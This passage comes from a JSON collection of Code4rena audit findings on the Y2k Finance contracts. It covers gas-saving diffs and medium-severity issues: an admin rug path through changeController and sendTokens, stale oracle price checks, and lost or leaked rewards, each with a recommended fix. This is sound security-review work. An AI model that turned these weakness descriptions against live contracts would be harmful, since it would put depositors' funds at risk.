src/oracles/PegOracle.sol:[29](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L29)\n\n```diff\ndiff --git a/src/oracles/PegOracle.sol b/src/oracles/PegOracle.sol\nindex 1c65268..8387ed9 100644\n--- a/src/oracles/PegOracle.sol\n+++ b/src/oracles/PegOracle.sol\n@@ -25,15 +25,16 @@ contract PegOracle {\n   25,  25:         require(_oracle1 != _oracle2, \"Cannot be same Oracle\");\n   26,  26:         priceFeed1 = AggregatorV3Interface(_oracle1);\n   27,  27:         priceFeed2 = AggregatorV3Interface(_oracle2);\n+       28:+        uint8 _decimals;\n   28,  29:         require(\n-  29     :-            (priceFeed1.decimals() == priceFeed2.decimals()),\n+       30:+            ((_decimals = priceFeed1.decimals()) == priceFeed2.decimals()),\n   30,  31:             \"Decimals must be the same\"\n   31,  32:         );\n   32,  33:\n   33,  34:         oracle1 = _oracle1;\n   34,  35:         oracle2 = _oracle2;\n   35,  36:\n-  36     :-        decimals = priceFeed1.decimals();\n+       37:+        decimals = _decimals;\n   37,  38:     }\n   38,  39:\n   39,  40:     /** @notice Returns oracle-fed data from the latest round\n```\n\n#### - src/rewards/RewardsFactory.sol:[90-91](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/RewardsFactory.sol#L90-L91)\n\n```diff\ndiff --git a/src/rewards/RewardsFactory.sol b/src/rewards/RewardsFactory.sol\nindex 8bee8bd..a679348 100644\n--- a/src/rewards/RewardsFactory.sol\n+++ b/src/rewards/RewardsFactory.sol\n@@ -87,8 +87,9 @@ contract RewardsFactory {\n   87,  87:     {\n   88,  88:         VaultFactory vaultFactory = VaultFactory(factory);\n   89,  89:\n-  90     :-        address _insrToken = vaultFactory.getVaults(_marketIndex)[0];\n-  91     :-        address _riskToken = vaultFactory.getVaults(_marketIndex)[1];\n+       90:+        address[] memory vaults = vaultFactory.getVaults(_marketIndex);\n+       91:+        address _insrToken = vaults[0];\n+       92:+        address _riskToken = vaults[1];\n   92,  93:\n   93,  94:         if(_insrToken == address(0) || _riskToken == address(0))\n   94,  95:             revert MarketDoesNotExist(_marketIndex);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "#g-02-cache-the-results-of-an-external-function-instead-of-calling-it-again-5-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5798",
      "title": "[G-01] Use custom errors rather than revert()/require() strings to save gas (13 instances)",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save ~50 gas each time they're hitby [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n- Deployment. Gas Saved: **105 127**\n\n- Minumal Method Call. Gas Saved: **72**\n\n- Average Method Call. Gas Saved: **134 279**\n\n- Maximum Method Call. Gas Saved: **139 061**\n\n#### - src/SemiFungibleVault.sol:[91](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L91), [116-119](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L116-L119)\n\n```diff\ndiff --git a/src/SemiFungibleVault.sol b/src/SemiFungibleVault.sol\nindex caf8eb7..da2bc98 100644\n--- a/src/SemiFungibleVault.sol\n+++ b/src/SemiFungibleVault.sol\n@@ -9,6 +9,9 @@ import {\n    9,   9: } from \"@openzeppelin/contracts/token/ERC1155/extensions/ERC1155Supply.sol\";\n   10,  10: import {ERC1155} from \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\n   11,  11:\n+       12:+error OnlyOwnerOrApproved();\n+       13:+error ZeroShares();\n+       14:+\n   12,  15: abstract contract SemiFungibleVault is ERC1155Supply {\n   13,  16:     using SafeTransferLib for ERC20;\n   14,  17:     using FixedPointMathLib for uint256;\n@@ -88,7 +91,7 @@ abstract contract SemiFungibleVault is ERC1155Supply {\n   88,  91:         address receiver\n   89,  92:     ) public virtual returns (uint256 shares) {\n   90,  93:         // Check for rounding error since we round down in previewDeposit.\n-  91     :-        require((shares = previewDeposit(id, assets)) != 0, \"ZERO_SHARES\");\n+       94:+        if((shares = previewDeposit(id, assets)) == 0) revert ZeroShares();\n   92,  95:\n   93,  96:         // Need to transfer before minting or ERC777s could reenter.\n   94,  97:         asset.safeTransferFrom(msg.sender, address(this), assets);\n@@ -113,10 +116,8 @@ abstract contract SemiFungibleVault is ERC1155Supply {\n  113, 116:         address receiver,\n  114, 117:         address owner\n  115, 118:     ) external virtual returns (uint256 shares) {\n- 116     :-        require(\n- 117     :-            msg.sender == owner || isApprovedForAll(owner, receiver),\n- 118     :-            \"Only owner can withdraw, or owner has approved receiver for all\"\n- 119     :-        );\n+      119:+        if(msg.sender != owner && !isApprovedForAll(owner, receiver)) revert OnlyOwnerOrApproved();\n+      120:+\n  120, 121:\n  121, 122:         shares = previewWithdraw(id, assets); // No need to check for rounding error, previewWithdraw rounds up.\n  122, 123:\n```\n\n#### - src/Vault.sol:[165](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L165), [187](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L187)\n\n```diff\ndiff --git a/src/Vault.sol b/src/Vault.sol\nindex 1d2e6df..a7e58b9 100644\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -162,7 +162,7 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  162, 162:         returns (uint256 shares)\n  163, 163:     {\n  164, 164:         // Check for rounding error since we round down in previewDeposit.\n- 165     :-        require((shares = previewDeposit(id, assets)) != 0, \"ZeroValue\");\n+      165:+        if((shares = previewDeposit(id, assets)) == 0) revert ZeroValue();\n  166, 166:\n  167, 167:         asset.transferFrom(msg.sender, address(this), shares);\n  168, 168:\n@@ -184,7 +184,7 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  184, 184:         payable\n  185, 185:         returns (uint256 shares)\n  186, 186:     {\n- 187     :-        require(msg.value > 0, \"ZeroValue\");\n+      187:+        if(msg.value == 0) revert ZeroValue();\n  188, 188:\n  189, 189:         IWETH(address(asset)).deposit{value: msg.value}();\n  190, 190:         assert(IWETH(address(asset)).transfer(msg.sender, msg.value));\n```\n\n#### - src/oracles/PegOracle.sol:[23-25](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L23-L25), [28-31](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L28-L31), [98-103](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L98-L103), [121-126](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L121-L126)\n\n```diff\ndiff --git a/src/oracles/PegOracle.sol b/src/oracles/PegOracle.sol\nindex 1c65268..31f1362 100644\n--- a/src/oracles/PegOracle.sol\n+++ b/src/oracles/PegOracle.sol\n@@ -3,6 +3,13 @@ pragma solidity 0.8.15;\n    3,   3:\n    4,   4: import \"@chainlink/interfaces/AggregatorV3Interface.sol\";\n    5,   5:\n+        6:+error ZeroTimestamp();\n+        7:+error OutdatedOracle();\n+        8:+error InvalidPrice();\n+        9:+error InvalidDecimals();\n+       10:+error SameOracle();\n+       11:+error ZeroAddress();\n+       12:+\n    6,  13: contract PegOracle {\n    7,  14:     /***\n    8,  15:     @dev  for example: oracle1 would be stETH / USD, while oracle2 would be ETH / USD oracle\n@@ -20,15 +27,13 @@ contract PegOracle {\n   20,  27:       * @param _oracle2 Second oracle address\n   21,  28:       */\n   22,  29:     constructor(address _oracle1, address _oracle2) {\n-  23     :-        require(_oracle1 != address(0), \"oracle1 cannot be the zero address\");\n-  24     :-        require(_oracle2 != address(0), \"oracle2 cannot be the zero address\");\n-  25     :-        require(_oracle1 != _oracle2, \"Cannot be same Oracle\");\n+       30:+        if(_oracle1 == address(0)) revert ZeroAddress();\n+       31:+        if(_oracle2 == address(0)) revert ZeroAddress();\n+       32:+        if(_oracle1 == _oracle2) revert SameOracle();\n   26,  33:         priceFeed1 = AggregatorV3Interface(_oracle1);\n   27,  34:         priceFeed2 = AggregatorV3Interface(_oracle2);\n-  28     :-        require(\n-  29     :-            (priceFeed1.decimals() == priceFeed2.decimals()),\n-  30     :-            \"Decimals must be the same\"\n-  31     :-        );\n+       35:+        if((priceFeed1.decimals() != priceFeed2.decimals())) revert InvalidDecimals();\n+       36:+\n   32,  37:\n   33,  38:         oracle1 = _oracle1;\n   34,  39:         oracle2 = _oracle2;\n@@ -95,12 +100,9 @@ contract PegOracle {\n   95, 100:             uint80 answeredInRound1\n   96, 101:         ) = priceFeed1.latestRoundData();\n   97, 102:\n-  98     :-        require(price1 > 0, \"Chainlink price <= 0\");\n-  99     :-        require(\n- 100     :-            answeredInRound1 >= roundID1,\n- 101     :-            \"RoundID from Oracle is outdated!\"\n- 102     :-        );\n- 103     :-        require(timeStamp1 != 0, \"Timestamp == 0 !\");\n+      103:+        if(price1 <= 0) revert InvalidPrice();\n+      104:+        if(answeredInRound1 < roundID1) revert OutdatedOracle();\n+      105:+        if(timeStamp1 == 0) revert ZeroTimestamp();\n  104, 106:\n  105, 107:         return price1;\n  106, 108:     }\n@@ -118,12 +120,9 @@ contract PegOracle {\n  118, 120:             uint80 answeredInRound2\n  119, 121:         ) = priceFeed2.latestRoundData();\n  120, 122:\n- 121     :-        require(price2 > 0, \"Chainlink price <= 0\");\n- 122     :-        require(\n- 123     :-            answeredInRound2 >= roundID2,\n- 124     :-            \"RoundID from Oracle is outdated!\"\n- 125     :-        );\n- 126     :-        require(timeStamp2 != 0, \"Timestamp == 0 !\");\n+      123:+        if(price2 <= 0) revert InvalidPrice();\n+      124:+        if(answeredInRound2 < roundID2) revert OutdatedOracle();\n+      125:+        if(timeStamp2 == 0) revert ZeroTimestamp();\n  127, 126:\n  128, 127:         return price2;\n  129, 128:     }\n```\n\n#### - src/rewards/StakingRewards.sol:[96](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L96), [119](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L119), [202-205](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L202-L205), [217-220](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L217-L220), [226-229](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L226-L229)\n\n```diff\ndiff --git a/src/rewards/StakingRewards.sol b/src/rewards/StakingRewards.sol\nindex 5edb4e8..3d59541 100644\n--- a/src/rewards/StakingRewards.sol\n+++ b/src/rewards/StakingRewards.sol\n@@ -18,6 +18,11 @@ import {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\";\n   18,  18: import {ERC20} from \"@solmate/tokens/ERC20.sol\";\n   19,  19: import \"./Owned.sol\";\n   20,  20:\n+       21:+error RewardPeriodMustComplite();\n+       22:+error InvalidToken();\n+       23:+error RewardTooHigh();\n+       24:+error ZeroAmount();\n+       25:+\n   21,  26: // https://docs.synthetix.io/contracts/source/contracts/stakingrewards\n   22,  27: contract StakingRewards is\n   23,  28:     IStakingRewards,\n@@ -93,7 +98,7 @@ contract StakingRewards is\n   93,  98:         whenNotPaused\n   94,  99:         updateReward(msg.sender)\n   95, 100:     {\n-  96     :-        require(amount != 0, \"Cannot stake 0\");\n+      101:+        if(amount == 0) revert ZeroAmount();\n   97, 102:         _totalSupply = _totalSupply.add(amount);\n   98, 103:         _balances[msg.sender] = _balances[msg.sender].add(amount);\n   99, 104:         stakingToken.safeTransferFrom(\n@@ -116,7 +121,7 @@ contract StakingRewards is\n  116, 121:         nonReentrant\n  117, 122:         updateReward(msg.sender)\n  118, 123:     {\n- 119     :-        require(amount > 0, \"Cannot withdraw 0\");\n+      124:+        if(amount == 0) revert ZeroAmount();\n  120, 125:         _totalSupply = _totalSupply.sub(amount);\n  121, 126:         _balances[msg.sender] = _balances[msg.sender].sub(amount);\n  122, 127:         stakingToken.safeTransferFrom(\n@@ -199,10 +204,7 @@ contract StakingRewards is\n  199, 204:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n  200, 205:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n  201, 206:         uint256 balance = rewardsToken.balanceOf(address(this));\n- 202     :-        require(\n- 203     :-            rewardRate <= balance.div(rewardsDuration),\n- 204     :-            \"Provided reward too high\"\n- 205     :-        );\n+      207:+        if(rewardRate > balance.div(rewardsDuration)) revert RewardTooHigh();\n  206, 208:\n  207, 209:         lastUpdateTime = block.timestamp;\n  208, 210:         periodFinish = block.timestamp.add(rewardsDuration);\n@@ -214,19 +216,13 @@ contract StakingRewards is\n  214, 216:         external\n  215, 217:         onlyOwner\n  216, 218:     {\n- 217     :-        require(\n- 218     :-            tokenAddress != address(stakingToken),\n- 219     :-            \"Cannot withdraw the staking token\"\n- 220     :-        );\n+      219:+        if(tokenAddress == address(stakingToken)) revert InvalidToken();\n  221, 220:         ERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n  222, 221:         emit Recovered(tokenAddress, tokenAmount);\n  223, 222:     }\n  224, 223:\n  225, 224:     function setRewardsDuration(uint256 _rewardsDuration) external onlyOwner {\n- 226     :-        require(\n- 227     :-            block.timestamp > periodFinish,\n- 228     :-            \"Previous rewards period must be complete before changing the duration for the new period\"\n- 229     :-        );\n+      225:+        if(block.timestamp <= periodFinish) revert RewardPeriodMustComplite();\n  230, 226:         rewardsDuration = _rewardsDuration;\n  231, 227:         emit RewardsDurationUpdated(rewardsDuration);\n  232, 228:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "#g-01-use-custom-errors-rather-than-revertrequire-strings-to-save-gas-13-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5797",
      "title": "[M-16] function changeController() has rug potential as admin can unilaterally withdraw all user funds from both risk and insure vaults",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L295>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L360-L366>\n\n### Impact\n\nAdmin can rug all user funds in every vault deployed by changing the controller address.\n\n### Proof of Concept\n\nController can be changed by admin anytime without any warning to users.\n\n[Vault.sol#L295](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L295)\n\n```solidity\n    function changeController(address _controller) public onlyFactory {\n        if(_controller == address(0))\n            revert AddressZero();\n        controller = _controller;\n    }\n```\n\nTokens in the vaults can then be called by the malicious contract to be transferred to their own address with `sendTokens()`.\n\n[Vault.sol#L360-L366](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L360-L366)\n\n```solidity\n    function sendTokens(uint256 id, address _counterparty)\n        public\n        onlyController\n        marketExists(id)\n    {\n        asset.transfer(_counterparty, idFinalTVL[id]);\n    }\n```\n\n#### Recommended Mitigation Steps\n\nAllow the change of controller address only in the `VaultFactory()`. This way, markets that have been created cannot have a different controller address, so users can be made aware of the change before choosing to make deposit of assets.\n\n**[MiguelBits (Y2K Finance) marked as duplicate and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/269#issuecomment-1262963676):**\n > Implemented timelock as issued in another finding.\n\n**[HickupHH3 (judge) decreased severity to QA and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/269#issuecomment-1298590961):**\n > Admin privilege finding, rationale for QA explained [here](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49#issuecomment-1295781746)\n\n**[yixxas (warden) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/269#issuecomment-1310848572):**\n > Hi @HickupHH3. Would like to seek clarifications on why this was downgraded to QA. In the rationale given, \"Those that explained the impact and vulnerability in detail will be grouped together with medium severity \".\n> \n> I believe the way a compromised admin can rug is clear in this report. `changeController()` can be used to change controller to any address. This address can then be used to call `sendTokens()` to steal all assets in every vault.\n\n**[HickupHH3 (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/269#issuecomment-1311187796):**\n > Took another look at this.\n> \n> I disagree with the recommended fix. The purpose for having the controller changeable in the deployed instances is well intentioned for upgradeability purposes: perhaps new features are to be added to the controller, and migration to a new controller for all existing vaults is required to incur less technical debt. Needing to maintain legacy controllers isn't great from a devops POV.\n> \n> That said, based on my rationale, the issue should stand as a medium severity issue until we have the introduction of centralisation reports. Kenzo said it well:\n> > IMO most of these trusted-actor issues basically just describe general properties of the crypto/governance ecosystems, and do not reflect a novel problem in the design/implementation (which wardens are paid to discover).\n> Because of this, and because of the circular logic, I believe we should change the rules and add a dedicated centralization report.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault.sol contract code which could allow an admin to rug all user funds in every vaults deployed by changing the controller address. The controller address can be changed by admin anytime without any warning to users. To exploit this vulnerability, the malicious contract can call the tokens in the vaults to be transferred to their own address with the `sendTokens()` function.\n\nThe recommended mitigation steps to prevent this vulnerability is to allow the change of controller address only in the `VaultFactory()`. This way, markets that have been created cannot have a different controller address, so users can be made aware of the change before choosing to make a deposit of assets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/269",
      "tags": [],
      "finders": [
        "yixxas"
      ]
    },
    {
      "id": "5796",
      "title": "[M-15] Rewards are not rolled over",
      "impact": "MEDIUM",
      "content": "\nIf there is no deposit for sometime in start then rewards for those period are never used.\n\n### Proof of Concept\n\n1.  Admin has added reward which made reward rate as 10 reward per second using notifyRewardAmount function\n\n<!---->\n\n    rewardRate = reward.div(rewardsDuration);\n\n2.  For initial 10 seconds there were no deposits which means total supply was 0\n3.  So no reward were distributed for initial 10 seconds and reward for this duration which is `10*10=100` will remain in contract\n4.  Since on notifying contract of new rewards, these stuck rewards are not considered, these 100 rewards will remain in contract with no usage\n\n### Recommended Mitigation Steps\n\nOn very first deposit, better to have (block.timestamp-startTime) &ast; rewardRate amount of reward being marked unused which can be used in next notifyrewardamount.\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93#issuecomment-1298314273):**\n > I see this as protocol leaked value since the rewards would be \"lost\" and isn't attributed to anyone. \n> \n> Currently, the sweeper function allows the reward token to be withdrawn, thus providing a form of recovery. However, [#49](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49) and its dups points out that this is a vuln, and if fixed, will remove this recovery.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StakingRewards.sol code. If there is no deposit for sometime in the start, then the reward for that period is never used. To demonstrate the issue, an admin added a reward which made the reward rate 10 rewards per second using the notifyRewardAmount function. For the initial 10 seconds, there were no deposits, so no rewards were distributed and 100 rewards remained in the contract with no usage. The recommended mitigation step to fix this issue is to have (block.timestamp-startTime) * rewardRate amount of reward being marked unused which can be used in the next notifyRewardAmount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93",
      "tags": [],
      "finders": [
        "csanuragjain"
      ]
    },
    {
      "id": "5795",
      "title": "[M-14] It's possible to change for Vault and lost control on it",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L345-L359>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L136>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L152>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L187-L190>\n\n### Impact\n\n`VaultFactory` allows admin to change `controller` for marketId(hedge and risk vaults) using `VaultFactory.changeController`. This method then set controller to both vaults. This address is important for `Vault` contract as it allows to call different functions.\n\n`VaultFactory` take care about different pair vaults through `indexVaults` mapping. `Controller` can get info about pairs vaults only through the correct `VaultFactory` that is provided to `Controller` in constructor.\n\nIt's possible that `VaultFactory.changeController` will set controller whose `vaultFactory` field is not equal to current `VaultFactory`. That means that when `Controller.triggerDepeg` or `Controller.triggerEndEpoch` will be called they will not be able to find the market.\n\nSo current controller will not be able to call hedge and risk vaults.\n\n### Proof of Concept\n\nThis is how the `controller` is set to vaults.\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L345-L359>\n\nController depends on `VaultFactory` to find vault for market.\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L136>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L152>\n\n### Recommended Mitigation Steps\n\nUse same check as you used in `VaultFactory.createNewMarket`\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/VaultFactory.sol#L187-L190>\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/66)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/66#issuecomment-1302212906):**\n > Agree with the issue that the incoming `Controller`'s `VaultFactory` should be verified to be the VaultFactory's address itself. Otherwise, there's a loss of functionality.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the `VaultFactory` contract, which allows the admin to change the `controller` for marketId. This change is important for the `Vault` contract as it allows to call different functions. However, it is possible that the `VaultFactory.changeController` will set a controller whose `vaultFactory` field is not equal to the current `VaultFactory`. This means that when `Controller.triggerDepeg` or `Controller.triggerEndEpoch` is called, they will not be able to find the market, and the current controller will not be able to call the hedge and risk vaults. \n\nThe proof of concept for this vulnerability is the code in the `VaultFactory.sol` file, which shows how the `controller` is set to vaults. The recommended mitigation step for this vulnerability is to use the same check as used in `VaultFactory.createNewMarket` in the `VaultFactory.sol` file.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/66",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "async"
      ]
    },
    {
      "id": "5794",
      "title": "[M-13] Different Oracle issues can return outdated prices",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/oracles/PegOracle.sol#L63>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Controller.sol#L308>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/oracles/PegOracle.sol#L126>\n\n### Impact\n\nDifferent problems have been found with the use of the oracle that can incur economic losses when the oracle is not consumed in a completely safe way.\n\n### Proof of Concept\n\nThe problems found are:\n\n*   The `timeStamp` check is not correct since in both cases it is done against 0, which would mean that a date of 2 years ago would be valid, so old prices can be taken.\n\n```javascript\n    function getLatestPrice(address _token)\n        public\n        view\n        returns (int256 nowPrice)\n    {\n        ...\n        if(timeStamp == 0)\n            revert TimestampZero();\n        return price;\n    }\n```\n\n*   Oracle price 1 can be outdated:\n\nThe `latestRoundData` method of the `PegOracle` contract calls `priceFeed1.latestRoundData();` directly, but does not perform the necessary round or timestamp checks, and delegates them to the caller, but these checks are performed on price2 because it calls `getOracle2_Price` in this case, this inconsistency between how it take the price1 and price2 behaves favors human errors when consuming the oracle.\n\n### Recommended Mitigation Steps\n\nFor the timestamp issue, it should be checked like this:\n\n```diff\n+   uint constant observationFrequency = 1 hours;\n\n    function getLatestPrice(address _token)\n        public\n        view\n        returns (int256 nowPrice)\n    {\n        ...\n        (\n            uint80 roundID,\n            int256 price,\n            ,\n            uint256 timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n\n        uint256 decimals = 10**(18-(priceFeed.decimals()));\n        price = price * int256(decimals);\n\n        if(price <= 0)\n            revert OraclePriceZero();\n\n        if(answeredInRound < roundID)\n            revert RoundIDOutdated();\n\n-       if(timeStamp == 0)\n+       if(timeStamp < block.timestamp - uint256(observationFrequency))\n            revert TimestampZero();\n\n        return price;\n    }\n```\n\n**[MiguelBits (Y2K Finance) confirmed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/61)** \n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/61#issuecomment-1279679681):**\n > Agree with the issue, but disagree with severity given. Checking for stale prices have historically been given a Medium severity rating; there isn't a compelling argument made IMO to increase it to High.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the 'PegOracle' contract. The vulnerability can lead to economic losses when the oracle is not used in a safe way. Three problems were identified: an incorrect timeStamp check, the possibility of outdated Oracle price 1, and inconsistency between how price 1 and price 2 are handled. To mitigate the issue, the timeStamp check should be updated to ensure that the price is not from more than one hour ago. This can be done by adding a constant observationFrequency and checking that the timeStamp is not less than the current block timestamp minus the observationFrequency.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/61",
      "tags": [
        "Stale Price"
      ],
      "finders": [
        "PwnPatrol",
        "scaraven",
        "leosathya",
        "ladboy233",
        "cryptphi",
        "JC",
        "nalus",
        "pashov",
        "Chom",
        "Lambda",
        "0x1f8b",
        "0x4non",
        "csanuragjain",
        "async",
        "ak1",
        "datapunk",
        "Rolezn",
        "Jeiwan",
        "unforgiven",
        "hyh"
      ]
    },
    {
      "id": "5793",
      "title": "[M-12] After the vault expires, users may still receive rewards through the StakingRewards contract",
      "impact": "MEDIUM",
      "content": "\nWhen the triggerEndEpoch function of the Controller contract is called, the assets in the insrVault will be sent to the riskVault, which also means that the tokens in the insrVault will be worthless.\n\n    insrVault.setClaimTVL(epochEnd, 0);\n    ...\n            else {\n                entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                    idClaimTVL[id],\n                    1 ether\n                );\n            }\n\nHowever, if the periodFinish > \\_epochEnd in the StakingRewards contract corresponding to the insrVault, the user can continue to stake his insrToken and receive rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Controller.sol#L223>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Vault.sol#L418-L423>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/rewards/StakingRewards.sol#L183-L210>\n\n### Recommended Mitigation Steps\n\nAdd the following code at the end of the notifyRewardAmount function of the StakingRewards contract to limit the periodFinish\n\n             lastUpdateTime = block.timestamp;\n             periodFinish = block.timestamp.add(rewardsDuration);\n    +       require(periodFinish <= id);\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/57)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/57#issuecomment-1297083026):**\n > Agree with issue; I view this as protocol leaked value (rewards) because it enables expired vault tokens that have no / little worth to \"steal\" rewards from future valid epochs. 1 time mint, lifetime rewards doesn't seem right.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Controller contract of the 2022-09-y2k-finance project on GitHub. When the triggerEndEpoch function is called, the assets in the insrVault are sent to the riskVault, making the tokens in the insrVault worthless. However, if the periodFinish in the StakingRewards contract corresponding to the insrVault is greater than the epochEnd, users can continue to stake their insrToken and receive rewards. The proof of concept is provided in the report and no tools were used in its identification. The recommended mitigation steps are to add code at the end of the notifyRewardAmount function of the StakingRewards contract to limit the periodFinish.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/57",
      "tags": [],
      "finders": [
        "cccz"
